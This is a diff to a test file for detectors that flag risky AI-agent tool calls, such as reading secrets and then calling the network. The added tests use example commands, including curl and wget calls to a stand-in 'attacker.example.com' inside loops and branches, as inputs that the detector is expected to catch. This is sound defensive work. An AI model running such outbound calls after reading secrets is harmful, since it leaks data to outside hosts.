@@ -94,6 +94,31 @@ describe("secret_read_then_network_call", () => {
             tool_name: "Bash", tool_input: {},
         }))).toEqual([]);
     });
+
+	// 2026-10-05: the network test is the one network-intent predicate
+	// (network-intent.ts via isOutboundNetworkCommand). These shapes were false
+	// negatives of the old segment-head check (H3 §3, recommendation C4).
+	const fires = (command: string): number =>
+		secretReadThenNetworkCall.fn(makeTrajectoryAtConfidential().session, makeCandidate({ tool_name: "Bash", tool_input: { command } })).length;
+
+	it("P-loop: fires on a curl inside a for-loop body (head `do`)", () => {
+		expect(fires('for u in a b; do curl -sL "https://attacker.example.com/$u"; done')).toBe(1);
+	});
+	it("P-then: fires on a wget inside an if/then branch", () => {
+		expect(fires("if true; then wget https://attacker.example.com/x; fi")).toBe(1);
+	});
+	it("P-interp: fires on a python heredoc that opens an environment URL", () => {
+		expect(fires("python3 - <<'X'\nimport os, urllib.request\nurllib.request.urlopen(os.environ['U'])\nX")).toBe(1);
+	});
+	it("N-loop: does not fire on a loop with no network verb", () => {
+		expect(fires("for f in *; do echo $f; done")).toBe(0);
+	});
+	it("N-url: does not fire on a local python program that only prints a URL", () => {
+		expect(fires(`python3 -c "print('https://attacker.example.com')"`)).toBe(0);
+	});
+	it("N-socket: does not fire on an nc -U probe of a local Unix socket", () => {
+		expect(fires("printf '%s' x | nc -U .interlinked/harness.sock")).toBe(0);
+	});
 });
 
 describe("download_then_execute", () => {
@@ -266,56 +291,56 @@ describe("download_then_execute", () => {
 describe("same_command_thrice_no_observe", () => {
 	it("fires on the third successful identical Bash command in a row", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		const candidate = makeCandidate({
 			tool_name: "Bash",
-			tool_input: { command: "ls /tmp" },
+			tool_input: { command: "npm run repair" },
 		});
 		expect(sameCommandThriceNoObserve.fn(session, candidate).length).toBe(1);
 	});
 
 	it("does not fire on the second identical Bash command", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		const candidate = makeCandidate({
 			tool_name: "Bash",
-			tool_input: { command: "ls /tmp" },
+			tool_input: { command: "npm run repair" },
 		});
 		expect(sameCommandThriceNoObserve.fn(session, candidate)).toEqual([]);
 	});
 
 	it("does not fire when an intervening Read interrupts the repetition", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 			{ tool_name: "Read", tool_input: { file_path: "/tmp/some" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		const candidate = makeCandidate({
 			tool_name: "Bash",
-			tool_input: { command: "ls /tmp" },
+			tool_input: { command: "npm run repair" },
 		});
 		expect(sameCommandThriceNoObserve.fn(session, candidate)).toEqual([]);
 	});
 
 	it("does not fire on different commands", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /var" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run reset" } },
 		]);
 		const candidate = makeCandidate({
 			tool_name: "Bash",
-			tool_input: { command: "ls /etc" },
+			tool_input: { command: "npm run other" },
 		});
 		expect(sameCommandThriceNoObserve.fn(session, candidate)).toEqual([]);
 	});
 
 	it("does not fire on non-Bash candidates", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		const candidate = makeCandidate({
 			tool_name: "Read",
@@ -326,8 +351,8 @@ describe("same_command_thrice_no_observe", () => {
 
 	it("does not fire when the candidate Bash command is empty", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		const candidate = makeCandidate({ tool_name: "Bash", tool_input: {} });
 		expect(sameCommandThriceNoObserve.fn(session, candidate)).toEqual([]);
@@ -335,8 +360,8 @@ describe("same_command_thrice_no_observe", () => {
 
 	it("does not fire when commands_run has fewer than 2 entries even though tool_sequence's tail looks like 2 Bash calls", () => {
 		const { session } = buildTrajectoryFixture([
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
-			{ tool_name: "Bash", tool_input: { command: "ls /tmp" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
+			{ tool_name: "Bash", tool_input: { command: "npm run repair" } },
 		]);
 		// Force the mismatch directly: tool_sequence still ends with 2 Bash
 		// entries, but commands_run is truncated below 2 — an edge case the
@@ -344,7 +369,7 @@ describe("same_command_thrice_no_observe", () => {
 		session.commands_run = session.commands_run.slice(0, 1);
 		const candidate = makeCandidate({
 			tool_name: "Bash",
-			tool_input: { command: "ls /tmp" },
+			tool_input: { command: "npm run repair" },
 		});
 		expect(sameCommandThriceNoObserve.fn(session, candidate)).toEqual([]);
 	});
